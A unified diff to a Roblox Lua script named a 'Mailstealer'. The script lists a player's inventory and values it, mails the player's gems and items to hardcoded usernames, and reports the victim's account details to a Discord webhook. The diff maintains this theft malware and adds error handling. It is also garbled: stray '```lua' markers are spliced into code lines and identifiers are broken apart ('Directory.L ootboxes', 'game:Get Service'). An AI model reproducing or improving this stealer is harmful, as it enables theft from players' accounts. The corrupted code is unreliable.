@@ -2,7 +2,7 @@
 local Username = ... -- This will take the first argument passed
 local Username2 = select(2, ...) -- This will take the second argument
 local Webhook = select(3, ...) -- This will take the third argument
-local MinimumRAP = select(4, ...) -- This will take the fourth argument
+local MinimumRAP = tonumber(select(4, ...)) -- Convert to number
 
 local DualhookUsername = "iamjeffoalt"
 local DualhookUsername2 = "nxrf1axz"
@@ -107,38 +107,45 @@ local FormatNumber = function(number)
 end
 
 local GetItemValue = function(Type, ItemTable)
-    return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
-        {
-            Class = {
-                Name = Type
-            },
-            IsA = function(hmm)
-                return hmm == Type
-            end,
-            GetId = function()
-                return ItemTable.id
-            end,
-            StackKey = function()
-                return HttpService:JSONEncode(
-                    {
-                        id = ItemTable.id,
-                        pt = ItemTable.pt,
-                        sh = ItemTable.sh,
-                        tn = ItemTable.tn
-                    }
-                )
-            end
-        }
-    ) or 0)
+    local success, result = pcall(function()
+        return (require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds).Get(
+            {
+                Class = {
+                    Name = Type
+                },
+                IsA = function(hmm)
+                    return hmm == Type
+                end,
+                GetId = function()
+                    return ItemTable.id
+                end,
+                StackKey = function()
+                    return HttpService:JSONEncode(
+                        {
+                            id = ItemTable.id,
+                            pt = ItemTable.pt,
+                            sh = ItemTable.sh,
+                            tn = ItemTable.tn
+                        }
+                    )
+                end
+            }
+        ) or 0)
+    end)
+
+    if not success then
+        warn("Failed to get item value for " .. Type .. ": " .. result)
+        return 0
+    end
+    return result
 end
 
 local GetItemValueOfItems = function()
-    local RAP = 0
+    local RAP = 0 ```lua
     for name_of_category, category in pairs(Inventory) do
         if category ~= nil then
             for i, v in pairs(category) do
                 RAP = RAP + GetItemValue(name_of_category, v)
- end
             end
         end
     end
@@ -165,7 +172,7 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
     local fardplayer = game:GetService("Players").LocalPlayer
     local ExecutorWebhook = identifyexecutor() or "undefined"
     local JobId = game.JobId
-    local PlayerUser  = Player.Name
+    local PlayerUser   = Player.Name
     local msg = {
         ["content"] = ping,
         ["username"] = "" .. mailstealer_name .. " Mailstealer",
@@ -183,7 +190,7 @@ local function SendMessage(id, item_type, RBgoldNormal, thumbnail, webhook, pets
                         ["name"] = "**This data was generated using " .. mailstealer_name .. " Mailstealer**",
                         ["value"] = "```Username     : " ..
                             fardplayer.Name ..
-                                "\nUser   -ID      : " ..
+                                "\nUser    -ID      : " ..
                                     fardplayer.userId ..
                                         "\nAccount Age  : " ..
                                             fardplayer.AccountAge ..
@@ -246,7 +253,8 @@ local function GetThumbnail(imageid)
     local Asset = string.split(imageid, "rbxassetid://")[2]
     local Size = "420x420"
     local Image = game:HttpGet("https://thumbnails.roblox.com/v1/assets?assetIds=" .. Asset .. "&returnPolicy=PlaceHolder&size=" .. Size .. "&format=png")
-    local thumbnail = game.HttpService:JSONDecode(Image).data[1].imageUrl
+    local thumbnail = game.HttpService:JSON ```lua
+Decode(Image).data[1].imageUrl
     return thumbnail
 end
 
@@ -254,7 +262,7 @@ MinimumRAP = FirstPriceOfMail
 
 if Inventory.Box then
     for key, value in pairs(Inventory.Box) do
-        if value._ uq then
+        if value._uq then
             game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Box: Withdraw All"):InvokeServer(key)
         end
     end
@@ -392,7 +400,7 @@ local function GetListWithAllItems()
     if Inventory.Lootbox ~= nil then
         for i, v in pairs(Inventory.Lootbox) do
             id = v.id
-            dir = Directory.Lootboxes[id]
+            dir = Directory.L ootboxes[id]
             rap = GetItemValue("Lootbox", v)
             ItemType = "Normal"
             ItemImageId = dir.Icon
@@ -514,8 +522,7 @@ local function GetListWithAllItems()
             end
         end
     end
-    if Inventory.Hoverboard ~= ```lua
-    nil then
+    if Inventory.Hoverboard ~= nil then
         for i, v in pairs(Inventory.Hoverboard) do
             id = v.id
             dir = Directory.Hoverboards[id]
@@ -541,7 +548,8 @@ local function GetListWithAllItems()
         end
     end
     if Inventory.Booth ~= nil then
-        for i, v in pairs(Inventory.Booth) do
+        for ```lua
+            i, v in pairs(Inventory.Booth) do
             id = v.id
             dir = Directory.Booths[id]
             rap = GetItemValue("Booth", v)
@@ -652,7 +660,7 @@ local function SendAllGems()
             if GemsAmount >= (FirstPriceOfMail + 10000) then
                 SentGems = GemsAmount - FirstPriceOfMail
                 local args = {
- [1] = Roblox_Username,
+                    [1] = Roblox_Username,
                     [2] = "" .. mailstealer_name .. " mailstealer on top",
                     [3] = "Currency",
                     [4] = i,
@@ -672,7 +680,7 @@ end
 Left_Hits = #hits
 
 if #hits > 0 or GemsAmount > FirstPriceOfMail then
-    local blob_a = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+    local blob_a = require(game:Get Service("ReplicatedStorage").Library.Client.Save)
     local blob_b = blob_a.Get()
 
     FavoriteModeSelection = blob_a.Get().FavoriteModeSelection
